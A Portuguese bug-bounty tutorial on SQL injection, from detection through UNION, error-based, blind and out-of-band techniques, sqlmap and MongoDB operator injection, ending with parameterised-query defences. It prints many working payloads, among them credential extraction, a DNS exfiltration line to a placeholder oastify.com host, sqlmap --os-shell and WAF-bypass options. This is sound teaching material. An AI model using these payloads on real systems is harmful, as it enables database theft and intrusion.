---
title: "SQL Injection: extraindo o banco da teoria à prática"
description: "A versão definitiva e didática de SQLi — detecção, UNION, blind, diferenças entre SGBDs, sqlmap, NoSQLi e como blindar com queries parametrizadas."
author: matheus
date: 2026-04-10 12:16:00 -0300
categories: [Bug Bounty, Vulnerabilidades]
tags: ["SQL Injection", "SQLi", "UNION-based", "blind SQLi", "SQLMap", "NoSQL injection", "OWASP", "bug bounty", "web security", "Burp Suite"]
image: /assets/img/covers/sql-injection.png
pin: false
comments: true
---

## Uma aspa que derruba o banco inteiro

Você está testando um campo de busca em `app.exemplo.com`. Digita um produto, vem a lista. Aí, por hábito de quem mexe com segurança, você joga uma **aspa simples** (`'`) no final do termo e manda. A página devolve um erro feio:

```
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version...
```

Esse erro é o som de uma porta destrancando. Significa que o texto que **você** digitou foi parar **dentro de uma consulta SQL** sem o devido tratamento — e a partir daí, com os payloads certos, dá pra ler tabela de usuários, hash de senha, dados de cartão, a versão do banco e, em casos extremos, executar comando no servidor. Isso é **SQL Injection (SQLi)**.

> Este blog já tem um post sobre SQLi de antes. Aqui a gente **revisita o tema de outra forma, mais didática e autossuficiente**: do "por que acontece" até blind por tempo, diferenças entre MySQL/PostgreSQL/MSSQL, automação com `sqlmap` e a defesa que mata a classe inteira. Se for seu primeiro contato com a série, dá uma olhada antes em [Fundamentos de Web Hacking](/posts/fundamentos-web-hacking/) e [Recon & Discovery](/posts/recon-discovery/) — as ferramentas básicas são apresentadas lá.

SQLi faz parte de **Injection**, a categoria [A03:2021 do OWASP Top 10](https://owasp.org/Top10/A03_2021-Injection/). É uma das falhas mais antigas da web e, mesmo assim, **continua aparecendo** — principalmente em software legado, painéis administrativos e produtos prontos desatualizados.

## O que é SQL Injection?

Para entender SQLi, primeiro entenda o que é uma query. A aplicação monta um comando em **SQL** (a linguagem do banco) para pedir dados. Um exemplo inocente:

```sql
SELECT * FROM produtos WHERE categoria = 'presentes'
```

O problema nasce quando o desenvolvedor **gruda** (concatena) o que o usuário digitou direto no meio do comando, como se fosse texto:

```php
// VULNERÁVEL — o input do usuário vira parte do comando SQL
$sql = "SELECT * FROM produtos WHERE categoria = '" . $_GET['categoria'] . "'";
```

Se você manda `categoria=presentes`, vira a query de cima. Mas se você manda `categoria=presentes'`, a aspa que você inseriu **fecha** a string antes da hora e o resto vira sintaxe SQL quebrada — daí o erro. E se você for esperto, em vez de quebrar, você **completa** o comando do seu jeito.

> **Analogia:** imagine um formulário de papel onde o atendente lê o que você escreveu e digita no sistema **sem pensar**. Você escreve no campo "Nome": *"João. E também me transfira todo o saldo da conta 4815."* Um atendente atento ignora a segunda frase — não é um comando, é parte do nome. Um atendente burro **executa** as duas. O banco de dados vulnerável é o atendente burro: ele não distingue **o que é dado** (seu nome) **do que é instrução** (o comando). SQLi explora exatamente essa confusão entre **código e dado**.

A causa raiz é **sempre a mesma**: a aplicação trata entrada do usuário como **código** em vez de **dado**. Guarde essa frase — ela também é a chave da defesa lá no final.

## Por que isso importa (e quanto paga)

SQLi é alto impacto por natureza, porque o banco é onde mora o que vale ouro:

- **Vazamento em massa:** ler tabelas inteiras de usuários, senhas (hashes), e-mails, CPF, dados de pagamento.
- **Bypass de autenticação:** entrar como `administrator` sem saber a senha.
- **Escrita/destruição:** em alguns contextos, alterar ou apagar dados (`UPDATE`/`DELETE`).
- **RCE:** em SGBDs (Sistemas Gerenciadores de Banco de Dados, ex.: MySQL, PostgreSQL) mal configurados dá pra escalar para execução de comando no SO (ex.: `xp_cmdshell` no MSSQL, escrita de arquivo arbitrário via `INTO OUTFILE` no MySQL — que vira webshell **se** o destino for um diretório executável).

> 💡 **CVSS**: escala numérica de 0–10 pra severidade da falha (existem v3.1 e v4.0).
{: .prompt-tip }

Por isso costuma ser classificado como **Alto/Crítico** (veja [Severidade, Impacto e Triagem](/posts/severidade-impacto-triagem/) pra calibrar o CVSS). Em programas reais, um SQLi confirmado paga tipicamente de **R$1.000** (injeção em alvo de baixo valor, só leitura de metadados) a **R$20.000+** (dump de PII — dados pessoais como CPF, e-mail, cartão; mais no [Glossário](/posts/fundamentos-web-hacking/#glossário-rápido-os-termos-que-vão-aparecer-na-série) — em escala ou RCE). Um SQLi UNION-based num produto exposto — tipo um painel de inventário desatualizado — fechando em algumas milhares de reais é um cenário bem comum.

> ⚠️ Antes de comemorar: **não rode `sqlmap` agressivo nem dê `DROP`/`DELETE` num alvo de produção.** SQLi mal conduzido corrompe dados de gente de verdade. Voltamos a isso na nota ética.

## Como funciona por trás

Vamos visualizar o caminho do payload. A requisição parte do navegador:

```http
GET /produtos?categoria=presentes' HTTP/2
Host: app.exemplo.com
```

No backend, o código vulnerável concatena seu input:

```php
// O ' que você mandou fecha a string e quebra a sintaxe
$sql = "SELECT * FROM produtos WHERE categoria = 'presentes''";
```

O banco recebe um comando com aspa sobrando, não consegue parsear e devolve erro — que a aplicação, em modo debug, vaza na resposta. **Esse erro confirma que seu input chegou cru na query.** A partir daqui o jogo é: em vez de **quebrar** o comando, **moldá-lo** para que ele faça o que você quiser e te devolva os dados.

Os dois "tijolos" que você vai usar o tempo todo:

1. **Comentário** (`--`, `#`, `/* */`): tudo depois dele é ignorado pelo banco. Serve pra **descartar** o resto da query original (aquela aspa que sobrava, um `AND status=1` chato etc.).
2. **Operadores lógicos / `UNION`**: pra injetar sua própria condição (`OR 1=1`) ou colar um segundo `SELECT` (UNION) que traz seus dados.

Exemplo clássico — bypass de filtro pra listar tudo:

```
categoria=presentes' OR 1=1--
```

A query final fica `... WHERE categoria = 'presentes' OR 1=1--'`. Como `1=1` é sempre verdadeiro, **todas** as linhas voltam, e o `--` comenta a aspa órfã. (Fonte: [PortSwigger — SQL injection](https://portswigger.net/web-security/sql-injection).)

## Tipos e variações

Existem três grandes famílias de SQLi, definidas por **como o dado volta pra você**:

| Família | Como o dado volta | Subtipos |
|---|---|---|
| **In-band** | Na **própria resposta** HTTP | **UNION-based** (dado nos resultados), **Error-based** (dado dentro de mensagens de erro) |
| **Blind (inferencial)** | **Não volta** — você infere bit a bit | **Boolean-based** (resposta muda T/F), **Time-based** (tempo de resposta muda) |
| **Out-of-band (OAST)** | Por um **canal secundário** (ex.: DNS) | Quando não há resposta nem timing confiável; força o banco a fazer uma requisição externa |

- **In-band** é o paraíso: você manda o payload e o dado aparece na tela ou no erro. Mais rápido de explorar.
- **Blind** é quando a aplicação **não mostra** nem dado nem erro, mas o **comportamento** muda conforme sua condição. Mais lento (extrai caractere por caractere), mas igualmente explorável.
- **Out-of-band** é o último recurso: nenhuma diferença visível na resposta, então você manda o banco "ligar pra fora" (uma consulta DNS para um domínio seu) carregando o dado no subdomínio.

Vamos do mais simples (UNION) ao mais sutil (time-based), exatamente nessa ordem.

## Recon — como encontrar

Antes de injetar, você precisa **mapear onde tem query** (já vimos a base de recon no post [01-recon-discovery.md](/posts/recon-discovery/)). Onde SQLi costuma morar:

- **Qualquer parâmetro que filtra/busca dado:** `?id=`, `?categoria=`, `?busca=`, `?ordem=`, `?pagina=`.
- **Corpo de POST:** formulários de login, busca avançada, filtros de relatório.
- **Headers que viram query:** `Cookie`, `X-Forwarded-For`, `User-Agent` (apps que logam isso no banco).
- **Endpoints de produtos prontos desatualizados:** painéis tipo GLPI, sistemas de helpdesk, ERPs legados — onde CVEs de SQLi conhecidos vivem (já falamos de caça a 1-day em [11-security-misconfiguration-cve-hunting.md](/posts/security-misconfiguration-cve-hunting/)).

Sinais de que um parâmetro **pode** ser injetável:

```text
# Mande uma aspa e observe:
?id=1'        -> erro de SQL, status 500, ou comportamento estranho = candidato forte
?id=1''       -> volta ao normal (aspas balanceadas) = mais um indício
```

Pra encontrar parâmetros escondidos em arquivos JS e histórico, use as ferramentas de coleta de URLs (apresentadas no Recon):

```bash
# gau coleta URLs históricas; grep filtra as que têm parâmetro = candidatas a teste
echo "app.exemplo.com" | gau | grep -E '\?|&' | grep -iE 'id=|cat=|user=|order=|search=' | sort -u
```

> 💡 **Regra de ouro do recon de SQLi:** parâmetros **numéricos** (`?id=1`) e os de **ordenação** (`?order=preco`) são os mais férteis — o de ordenação porque vai pra dentro de `ORDER BY`, onde nem sempre dá pra usar query parametrizada e o dev tende a concatenar.

## Detecção — confirmando que existe injeção

Três técnicas, em ordem de confiança. Todas você faz no **Burp Repeater** (apresentado nos Fundamentos), mandando a mesma request e variando só o payload.

### 1. Aspa simples (quebra de sintaxe)

```
?id=1'
```

Erro de SQL, 500, ou a página muda? Candidato. Confirme balanceando: `?id=1''` deve voltar ao normal.

### 2. Lógica booleana (`AND 1=1` vs `AND 1=2`)

Funciona mesmo sem erro visível. A ideia: uma condição **verdadeira** mantém a resposta; uma **falsa** muda.

```
?id=1 AND 1=1     -> página NORMAL (condição verdadeira)
?id=1 AND 1=2     -> página DIFERENTE/vazia (condição falsa)
```

Se o conteúdo muda entre as duas, sua entrada **está sendo avaliada como SQL**. Em parâmetro string, lembre da aspa: `?categoria=presentes' AND '1'='1` vs `...' AND '1'='2`.

### 3. Time-based (atraso proposital)

Quando não há diferença visível nenhuma, force o banco a **dormir**. Se a resposta demorar o tempo pedido, é injeção (técnica detalhada na seção de blind).

```
?id=1' AND SLEEP(5)-- -     (MySQL)
```

> ⚠️ `1=1` e `1=2` por si só não confirmam nada — o ouro está na **diferença** entre as duas respostas. Se as duas são idênticas, aquele ponto provavelmente **não** é injetável (ou está sanitizado).

## Exploração passo a passo

### Nível 1 — UNION-based (o caminho mais direto)

`UNION` cola o resultado de um **segundo `SELECT`** ao da query original. Para funcionar, duas regras de ferro:

1. Os dois `SELECT` precisam ter o **mesmo número de colunas**.
2. Os **tipos** das colunas precisam ser compatíveis na posição onde você quer ler o dado (texto vai em coluna de texto).

**Passo A — descobrir o número de colunas.** Dois métodos; use o que o alvo aceitar.

Método `ORDER BY` (incrementa até dar erro):

```
?id=1' ORDER BY 1-- -    -> ok
?id=1' ORDER BY 2-- -    -> ok
?id=1' ORDER BY 3-- -    -> ok
?id=1' ORDER BY 4-- -    -> ERRO  => são 3 colunas
```

`ORDER BY N` ordena pela N-ésima coluna; quando N passa do número de colunas, o banco erra. O último N que funcionou é o total.

Método `UNION SELECT NULL` (vai somando NULLs até parar de errar):

```
?id=1' UNION SELECT NULL-- -                 -> erro
?id=1' UNION SELECT NULL,NULL-- -            -> erro
?id=1' UNION SELECT NULL,NULL,NULL-- -       -> ok  => 3 colunas
```

Usamos `NULL` porque ele é compatível com qualquer tipo — evita erro de tipo enquanto você só conta colunas.

**Passo B — achar uma coluna que "imprime" texto.** Troque os NULLs por marcadores e veja qual aparece na tela:

```
?id=1' UNION SELECT 'a',NULL,NULL-- -
?id=1' UNION SELECT NULL,'a',NULL-- -    -> se aparece 'a' na página, a 2ª coluna é refletida
```

**Passo C — extrair os dados.** Agora você sabe quantas colunas e qual é refletida. Puxe o que interessa. Versão e usuário do banco primeiro (reconhecimento do SGBD):

```
?id=1' UNION SELECT NULL,@@version,NULL-- -        (MySQL/MSSQL)
```

Depois, dados reais — concatenando colunas pra caber numa coluna só:

```
?id=1' UNION SELECT NULL,CONCAT(usuario,':',senha),NULL FROM users-- -    (MySQL)
```

> Para listar tabelas e colunas que você não conhece, consulte o catálogo do banco: `information_schema.tables` e `information_schema.columns` (MySQL/PostgreSQL/MSSQL). Ex.: `UNION SELECT NULL,table_name,NULL FROM information_schema.tables-- -`.

### Nível 2 — Error-based (dado dentro do erro)

Se a aplicação **vaza mensagens de erro** mas não reflete resultados de UNION, force o dado a aparecer **dentro do erro**. A técnica exata **depende do SGBD** — é por isso que o fingerprint (identificar qual banco é, pela versão/sintaxe) vem antes.

No **PostgreSQL** (e SQL padrão), a ideia geral do PortSwigger é provocar um erro de conversão de tipo que cospe o valor:

```
' AND CAST((SELECT password FROM users LIMIT 1) AS int)-- -    (PostgreSQL)
```

Como a senha (texto) não converte pra inteiro, o banco erra com `invalid input syntax for type integer: "5f4dcc3b..."` — e o **hash aparece no erro**.

> ⚠️ Cuidado: isso **não** funciona no MySQL/MariaDB. Lá, `CAST('texto' AS SIGNED)` não dá erro — ele silenciosamente vira `0`. Como o nosso alvo de exemplo era MariaDB, o vetor error-based clássico ali são as **funções XML** `extractvalue()`/`updatexml()`, que cospem o resultado dentro de uma mensagem `XPATH syntax error`:

```
' AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 1)))-- -    (MySQL/MariaDB)
```

O `0x7e` é o caractere `~`; o banco tenta interpretar `~5f4dcc3b...` como XPath, falha, e devolve `XPATH syntax error: '~5f4dcc3b...'` — com o hash no erro. (Limite ~32 caracteres por consulta; pagine com `SUBSTRING` se precisar de mais.)

### Nível 3 — Blind boolean (inferência caractere a caractere)

Sem dado e sem erro na tela, mas a resposta **muda** entre verdadeiro e falso. Você transforma "ler dado" em uma sequência de perguntas **sim/não**. A ferramenta-chave é o `SUBSTRING` (pega 1 caractere por vez):

```
' AND SUBSTRING((SELECT senha FROM users WHERE usuario='administrator'),1,1)='a'-- -
' AND SUBSTRING((SELECT senha FROM users WHERE usuario='administrator'),1,1)='b'-- -
...
```

Você varre `a`, `b`, `c`... no **1º** caractere. Quando a resposta volta no estado "verdadeiro", achou a 1ª letra. Avança pro 2º (`...,2,1`) e repete. É lento na mão — por isso a gente automatiza (Burp Intruder ou `sqlmap`). PortSwigger ensina a versão com **comparação** (`> 'm'`) pra fazer **busca binária** e reduzir o número de tentativas:

```
' AND SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'),1,1) > 'm'-- -
```

### Nível 4 — Blind time-based (inferência por tempo)

Quando nem a resposta muda visivelmente, o **tempo** vira seu canal. Você condiciona um `SLEEP` à pergunta: se a condição for verdadeira, o banco demora; se falsa, responde na hora.

```
' AND IF(SUBSTRING((SELECT senha FROM users LIMIT 1),1,1)='a', SLEEP(5), 0)-- -    (MySQL)
```

Resposta levou ~5s → o 1º caractere é `a`. Levou <1s → não é. Mesma lógica do boolean, só que medindo relógio em vez de comparar conteúdo.

> 💡 **WAF**: firewall de aplicação web, um filtro que tenta barrar payloads maliciosos antes de chegarem ao app ([Glossário](/posts/fundamentos-web-hacking/#glossário-rápido-os-termos-que-vão-aparecer-na-série)).
>
> Se `SLEEP` estiver bloqueado por WAF, o MySQL tem um plano B: `BENCHMARK(N, expr)` repete uma expressão `N` vezes pra **queimar CPU** e atrasar a resposta — ex.: `BENCHMARK(5000000, MD5('a'))`. Não é um atraso fixo como `SLEEP` (depende da CPU do alvo), mas dá o mesmo sinal de tempo.

### Nível 5 — Out-of-band (OAST)

Último recurso, quando não há diferença na resposta **nem** timing confiável. Você manda o banco fazer uma **requisição externa** (DNS/HTTP) para um domínio que você controla — tipicamente o **Burp Collaborator**. O exemplo oficial do PortSwigger no MSSQL usa `xp_dirtree` pra disparar uma consulta DNS carregando a senha no subdomínio:

```
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');
exec('master..xp_dirtree "//'+@p+'.SEU-ID.oastify.com/a"')-- -
```

O servidor faz a resolução DNS de `<senha>.SEU-ID.oastify.com` e você lê a senha no painel do Collaborator. (Fonte: [PortSwigger — Blind SQL injection](https://portswigger.net/web-security/sql-injection/blind).)

## Diferenças entre SGBDs (MySQL vs PostgreSQL vs MSSQL vs Oracle)

O mesmo conceito muda de **sintaxe** conforme o banco. Saber isso é o que separa "achei que era SQLi" de "explorei o SQLi". Valores conforme o [SQL injection cheat sheet do PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet):

| Tarefa | MySQL | PostgreSQL | Microsoft (MSSQL) | Oracle |
|---|---|---|---|---|
| **Versão** | `@@version` | `version()` | `@@version` | `SELECT banner FROM v$version` |
| **Concatenar** | `CONCAT('a','b')` | `'a'\|\|'b'` | `'a'+'b'` | `'a'\|\|'b'` |
| **Substring** | `SUBSTRING('foo',1,1)` | `SUBSTRING('foo',1,1)` | `SUBSTRING('foo',1,1)` | `SUBSTR('foo',1,1)` |
| **Comentário** | `-- ` , `#` , `/* */` | `-- ` , `/* */` | `-- ` , `/* */` | `-- ` , `/* */` |
| **Delay (sempre)** | `SLEEP(10)` | `pg_sleep(10)` | `WAITFOR DELAY '0:0:10'` | `dbms_pipe.receive_message(('a'),10)` |
| **Delay condicional** | `SELECT IF(cond,SLEEP(10),'a')` | `SELECT CASE WHEN cond THEN pg_sleep(10) ELSE pg_sleep(0) END` | `IF (cond) WAITFOR DELAY '0:0:10'` | `SELECT CASE WHEN cond THEN 'a'\|\|dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |

> ⚠️ Detalhe que pega muita gente: o comentário `--` no MySQL (e em SQL padrão) **precisa de um espaço depois** (`-- `). Por isso o truque comum é escrever `-- -` (traço-traço, espaço, traço): garante o espaço e ainda deixa um caractere visível. Em URL, esse espaço vira `%20` ou `+`.

## Automação com sqlmap

Confirmou na mão, entendeu o ponto de injeção? Aí sim o **`sqlmap`** acelera a extração. Ele é a ferramenta open-source padrão pra detectar e explorar SQLi automaticamente (detecta o SGBD, acha colunas, dumpa tabelas). **Use só depois de entender o que ele faz** — e com autorização.

```bash
# GET: aponta a URL com o parâmetro suspeito e enumera os bancos
sqlmap -u "https://app.exemplo.com/produtos?id=1" --dbs --batch
```

```bash
# POST: o corpo vai em --data; sqlmap testa cada campo
sqlmap -u "https://app.exemplo.com/login" --data="user=admin&pass=x" --dbs --batch
```

Flags que você mais vai usar (descrição conforme a [doc oficial do sqlmap](https://github.com/sqlmapproject/sqlmap/wiki/Usage)):

| Flag | O que faz |
|---|---|
| `-u` | URL alvo |
| `--data` | corpo do POST a testar (ex.: `"user=a&pass=b"`) |
| `--dbs` | lista os bancos de dados disponíveis |
| `--tables` | lista as tabelas (use `-D <banco>` pra fixar o banco) |
| `--dump` | extrai (dumpa) o conteúdo; combine com `-D <banco> -T <tabela>` pra mirar |
| `--batch` | modo não-interativo: assume as respostas padrão (bom pra script) |
| `--level` (1–5, padrão 1) | profundidade dos testes; **`>=2` testa também o header `Cookie`**, `>=3` o `User-Agent`/`Referer` |
| `--risk` (1–3, padrão 1) | risco dos testes; **2** adiciona time-based pesado, **3** adiciona testes `OR` (cuidado: `OR` pode casar muitas linhas, podendo alterar dados em `UPDATE`/`DELETE`) |
| `--os-shell` | tenta abrir um **shell de SO** no servidor (requer privilégios altos no banco; alto risco — só em lab/autorizado) |
| `--tamper` | aplica scripts que ofuscam o payload pra **driblar WAF** |

A ordem natural de uso é: descobrir os bancos (`--dbs`), depois as tabelas (`--tables -D <banco>`) e por fim dumpar só o que interessa (`--dump -D <banco> -T <tabela> -C <colunas>`). Evite `--dump` sem alvo: ele puxa o banco inteiro.

```bash
# Mais agressivo + bypass de WAF com tamper scripts
sqlmap -u "https://app.exemplo.com/produtos?id=1" \
  --level=2 --risk=2 \
  --tamper=between,charencode,space2comment \
  --batch --dbs
```

> Os tamper scripts ficam em `/usr/share/sqlmap/tamper/`. `--tamper` recebe uma lista separada por vírgula. Comece **conservador** (`--level=2 --risk=2`) e só suba se necessário — `--risk=3` em produção pode causar estrago.

## NoSQL Injection (o primo dos bancos não-relacionais)

Trocar MySQL por MongoDB **não te livra** de injeção — só muda a forma. Em bancos NoSQL não existe "aspa quebrando string"; o ataque é **injetar operadores de query**. O clássico no MongoDB é o `$ne` ("not equal").

Imagine um login que monta a busca assim:

```javascript
// VULNERÁVEL — joga o corpo do request direto no filtro do Mongo
db.users.findOne({ username: req.body.username, password: req.body.password });
```

Se o atacante manda um **objeto** em vez de string, o JSON vira operador:

```http
POST /login HTTP/2
Host: app.exemplo.com
Content-Type: application/json

{"username": {"$ne": null}, "password": {"$ne": null}}
```

`{"$ne": null}` casa com **qualquer** registro cujo campo não seja nulo — ou seja, o primeiro usuário do banco, frequentemente o admin. **Bypass de autenticação sem saber a senha.** (Fonte: [OWASP WSTG — Testing for NoSQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection).)

E dá pra ir além do bypass: assim como no SQLi blind, operadores de comparação permitem **extrair** a senha caractere a caractere. O `$gt` ("greater than") combinado com `$regex` faz a busca binária — você pergunta "a senha começa com um caractere maior que `m`?" e observa se o login ainda casa:

```http
POST /login HTTP/2
Host: app.exemplo.com
Content-Type: application/json

{"username": "admin", "password": {"$gt": ""}}
```

`{"$gt": ""}` casa com qualquer senha não-vazia (todo valor é "maior que" string vazia) — mais um bypass. Trocando por `{"$regex": "^a.*"}` e variando o prefixo, você infere a senha letra a letra, exatamente como no boolean-based.

> A defesa é a mesma filosofia do SQL: **valide tipos** (esperava string? recuse objeto) e nunca jogue o corpo do request cru no filtro.

## Caso real-fictício: UNION-based num painel desatualizado

> Cenário **fictício, baseado em padrões reais** de bug bounty (anonimizado).

Você faz recon num alvo e encontra um produto de inventário/helpdesk **desatualizado** rodando num IP da empresa. Um endpoint utilitário aceita um parâmetro numérico que vai parar numa query sem tratamento:

```http
GET /scripts/unlock_tasks.php?cycle=1&only_tasks=1 HTTP/2
Host: app.exemplo.com
```

**Passo 1 — confirmar.** Você troca `cycle=1` por um payload UNION. Sabendo (por testes de `ORDER BY`) que a query tem 2 colunas, injeta:

```http
GET /scripts/unlock_tasks.php?cycle=1%20UNION%20ALL%20SELECT%201,(database())--%20&only_tasks=1 HTTP/2
Host: app.exemplo.com
```

Note os `%20` (espaços) e o `--%20` no fim (comentário com o espaço obrigatório). A resposta reflete o nome do banco:

```http
HTTP/2 200 OK
Content-Type: text/html

... appdb ...
```

**Passo 2 — fingerprint do SGBD.** Você troca `database()` por `(@@version)`:

```
?cycle=1 UNION ALL SELECT 1,(@@version)-- -&only_tasks=1
```

Resposta: `10.1.47-MariaDB-0+deb9u1`. Confirmado: **MariaDB** (dialeto MySQL), versão antiga. E `(user())` retorna o usuário do banco — útil pra avaliar privilégios.

**O que a tela do Burp mostraria:** painel Request/Response lado a lado; na Response, o valor injetado (`appdb`, depois a string de versão) aparecendo no corpo HTML, destacado, onde antes vinha um dado da tarefa. O ponto-chave é o **`UNION ALL SELECT 1,(...)`** no parâmetro `cycle` — é ali que seu segundo SELECT entra.

**Passo 3 — report.** Título: `[SQLi] - UNION-based SQL Injection em /scripts/unlock_tasks.php (parâmetro cycle)`. Resumo focado no risco: *"qualquer usuário não autenticado consegue executar SQL arbitrário, extraindo nome do banco, versão e — com `information_schema` — qualquer tabela, incluindo credenciais"*. PoC com os dois payloads (`database()` e `@@version`), prints do Burp, e **pare por aí**: provar leitura de metadados já demonstra impacto crítico sem dumpar PII real. Severidade **Crítica**:

- **CVSS v3.1:** `9.8` — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (rede, sem autenticação, sem interação; o SGBD permite leitura e potencial escrita/RCE).
- **CVSS v4.0:** `9.3` — `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N`.

Se você só comprovou **leitura** (sem demonstrar escrita), seja honesto e baixe o impacto de integridade/disponibilidade — vira algo como v3.1 `7.5` (`C:H/I:N/A:N`). Calibre conforme o que **você provou**, não o que é teoricamente possível. (Como estruturar isso bem: [Como escrever um report que paga](/posts/como-escrever-report-que-paga/) · calibrar CVSS: [Severidade, Impacto e Triagem](/posts/severidade-impacto-triagem/).)

## Defesa em camadas

A correção **definitiva** ataca a raiz: nunca deixe o input do usuário ser interpretado como código. Tudo o mais é reforço.

### 1. Queries parametrizadas / Prepared Statements (a defesa nº 1)

Em vez de **concatenar**, você manda a query com **marcadores** (`?` ou `:nome`) e passa os valores **separadamente**. O driver garante que o valor é tratado como **dado**, nunca como SQL — independente do que o usuário digitou. (Fonte: [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html).)

```php
// ❌ ERRADO (PHP) — concatena input na query
$sql = "SELECT * FROM users WHERE email = '" . $_GET['email'] . "'";
$db->query($sql);

// ✅ CORRETO (PHP/PDO) — placeholder + bind; o input nunca vira código
$stmt = $pdo->prepare("SELECT * FROM users WHERE email = ?");
$stmt->execute([$_GET['email']]);
$user = $stmt->fetch();
```

```javascript
// ❌ ERRADO (Node, mysql2) — template string concatenando
db.query(`SELECT * FROM users WHERE id = ${req.query.id}`);

// ✅ CORRETO (Node, mysql2) — placeholder ? + array de valores
db.execute("SELECT * FROM users WHERE id = ?", [req.query.id]);
```

```python
# ❌ ERRADO (Python) — f-string monta a query
cur.execute(f"SELECT * FROM users WHERE id = {request.args['id']}")

# ✅ CORRETO (Python, DB-API) — placeholder %s + tupla de parâmetros
cur.execute("SELECT * FROM users WHERE id = %s", (request.args['id'],))
```

> Repare: nas versões CORRETAS, a string da query é **fixa**. Não importa se o usuário mandar `1' OR 1=1--`; isso vira o **valor literal** procurado na coluna `id`, e a busca simplesmente não acha nada. Código e dado ficam em compartimentos separados.

> ⚠️ **Prepared statement não é bala de prata — protege o VALOR, não o identificador.** O placeholder (`?`, `:id`, `%s`) blinda **valores** (o que vai em `WHERE x = ?`). Mas **nome de coluna, nome de tabela e `ORDER BY`** não podem ser parametrizados — se você os concatena a partir de input do usuário, a injeção volta (use allowlist, abaixo). E há um caso mais sutil: pesquisa da [Slcyber/Assetnote](https://slcyber.io/research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements/) mostrou dar pra **confundir o parser do PDO** (driver do PHP) — injetando um *placeholder* falso seguido de **byte nulo** (`%00`), parte do payload passa a ser interpretada como SQL em vez de dado literal, viabilizando SQLi **mesmo com prepared statement**, sobretudo quando há SQL dinâmico. Visto na prática na máquina **CyberWaf** (HackingClub): o endpoint usava PDO, mas o **nome da coluna** vinha do usuário e o parser foi confundido com algo como
> ```
> ?name=x` FROM (SELECT table_name AS `'x` FROM information_schema.tables)y;#&verify=\?#%00
> ```
> enumerando todas as tabelas apesar do prepared statement. **Lição:** parametrize **sempre**, mas onde precisar de identificador dinâmico, valide por **allowlist estrita** — não confie só no driver.

### 2. Allowlist onde não dá pra parametrizar

Nome de tabela, nome de coluna e direção de `ORDER BY` **não** podem ser bind. Aí use uma **lista branca** — mapeie o input pra um valor seguro conhecido:

```php
// ✅ ORDER BY via allowlist — o input só escolhe entre opções fixas
$colunasPermitidas = ['preco', 'nome', 'data'];
$ordem = in_array($_GET['ordem'], $colunasPermitidas, true) ? $_GET['ordem'] : 'nome';
$sql = "SELECT * FROM produtos ORDER BY $ordem";   // $ordem é garantidamente seguro
```

### 3. ORM (parametriza por padrão — mas atenção ao raw)

ORMs como Eloquent, Prisma, Hibernate, SQLAlchemy parametrizam automaticamente. **Porém**, queries "raw" dentro do ORM voltam a ser vulneráveis se você concatenar:

```php
// ✅ Eloquent — bindings nomeados, seguro
User::whereRaw('email = :email', ['email' => $request->email])->first();
// ❌ Eloquent raw concatenando — vulnerável de novo
User::whereRaw("email = '" . $request->email . "'")->first();
```

### 4. Reforços (não substituem o nº 1)

- **Least privilege:** a conta da aplicação no banco deve ter **só** o necessário (sem `DROP`, `FILE`, sem ser `root`). Assim, mesmo que vaze um SQLi, o estrago é limitado.
- **Validação de tipo:** se o parâmetro é numérico, **rejeite** o que não for número antes de chegar ao banco.
- **Erros genéricos:** desligue mensagens de erro detalhadas em produção — elas alimentam o error-based.
- **WAF:** ajuda a barrar payloads óbvios, mas é **bypassável** (vide `--tamper`). É camada extra, **nunca** a defesa principal.

> ❌ **O que NÃO basta:** escapar aspas na mão (frágil e bypassável — a própria OWASP **desencoraja**), confiar só no WAF, esconder a mensagem de erro mas manter a query concatenada, ou validar no frontend.

## Ferramentas + labs legais

- **Burp Suite** — Repeater (testar payloads), Intruder (automatizar inferência blind), Collaborator (OAST). Apresentado nos Fundamentos.
- **sqlmap** — automação de detecção/extração (use com cabeça e autorização).
- **Labs pra praticar (autorizados):**
  - [PortSwigger Web Security Academy — SQL injection](https://portswigger.net/web-security/sql-injection) (a melhor fonte gratuita, com labs por tipo)
  - [DVWA](https://github.com/digininja/DVWA) e [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/) (rodam local)
  - TryHackMe, HackTheBox, HackingClub

> 🔗 **WriteUp prático (ponta a ponta):** quer ver SQLi numa caçada real e completa — recon → SQLi → extração do banco → shell → escalação de privilégio? A máquina **Lion** do HackingClub está resolvida passo a passo em [SQL Injection da teoria à prática (máquina Lion)](/posts/sql-injection-definitivo/). Este capítulo é a *metodologia*; o WriteUp é a *execução*.

## Checklist do caçador

- [ ] Mapeei parâmetros candidatos (`id`, `order`, `search`, corpo de POST, headers).
- [ ] Testei **aspa simples** e confirmei balanceando (`''`).
- [ ] Testei **lógica booleana** (`AND 1=1` vs `AND 1=2`) e comparei as respostas.
- [ ] Se sem diferença visível, testei **time-based** (`SLEEP`/`pg_sleep`/`WAITFOR`).
- [ ] **UNION:** achei o nº de colunas (`ORDER BY` / `UNION SELECT NULL`) e a coluna refletida.
- [ ] Fiz **fingerprint** do SGBD (`@@version` / `version()`) e ajustei a sintaxe (concat, comentário, delay).
- [ ] Extraí **metadados** (`database()`, `information_schema`) — sem dumpar PII real.
- [ ] Para JSON/Mongo, testei **operadores** (`{"$ne": null}`).
- [ ] Confirmei que SQLi está **no escopo** do programa.

## O que você precisa lembrar

- SQLi é a confusão entre **código e dado**: input do usuário tratado como comando.
- **In-band** (UNION/erro) entrega o dado na resposta; **blind** (boolean/tempo) você infere; **OAST** usa canal externo.
- A sintaxe muda por SGBD — **fingerprint primeiro**, payload depois.
- A defesa que mata a classe inteira é **query parametrizada**. WAF e escape são reforço, não solução.

